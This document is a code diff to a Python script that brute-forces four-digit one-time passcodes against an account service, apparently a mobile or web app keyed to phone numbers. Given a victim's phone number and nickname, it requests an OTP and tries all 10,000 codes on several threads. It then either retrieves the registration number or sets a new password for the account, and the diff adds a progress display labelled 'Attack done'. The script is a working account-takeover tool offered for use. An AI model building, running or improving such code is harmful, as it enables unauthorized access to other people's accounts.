@@ -3,7 +3,9 @@ from time import sleep
 import random
 from concurrent.futures import ThreadPoolExecutor as TPE
 from queue import Queue as Q
+from sys import stdout
 
+print("initializing...")
 NumberOfThreads = 5
 q = Q()
 with open("4digits.txt") as f:
@@ -15,8 +17,6 @@ with open("4digits.txt") as f:
         q.put(random_otp)
         otpList.remove(random_otp)
 print("""
-      --->This update uses multi-threadin. Hence, even faster results!<---
-      
 what do you want?
 
 1) Get registration number from Nickname & Phone Number
@@ -25,6 +25,9 @@ what do you want?
 
 """)
 
+def showProgress(done,nowTrying):
+    stdout.write(f"\rNow trying: {nowTrying} | Attack done: {done/100}% ")
+    stdout.flush()
 
 choice = int(input("(1/2): "))
 phone = input("PhoneNumber(example:88017********): ")
@@ -32,11 +35,12 @@ if choice==1:
     nickname = input("Type nickname(case sensitive): ")
     target = getRegNumber(phone,nickname)
     target.req_otp()
-    print("otp sent")
     def crack():
         while target.wrongOTP:
             otp = q.get()
             target.tryOTP(otp)
+            Done = 10000 - q.qsize()
+            showProgress(Done,nowTrying=otp)#shows progress in percentage
     with TPE(max_workers=NumberOfThreads) as executor:
         executor.submit(crack)
 
@@ -49,13 +53,15 @@ elif choice==2:
         while target.wrongOTP:
             otp = q.get()
             target.tryOTP(otp)
+            Done = 10000 - q.qsize()
+            showProgress(Done,otp)
     NewPassword = input("Type a new password (atleast 6 charecters long):")
     with TPE(max_workers=NumberOfThreads) as executor:
         executor.submit(crack)
     while target.wrongOTP:
         sleep(1)
     target.changePass(NewPassword)
-    print("Password was changed to:",NewPassword)
+    print("Password was succesfully changed!")
 else:
     print("Invalid input")
     exit()
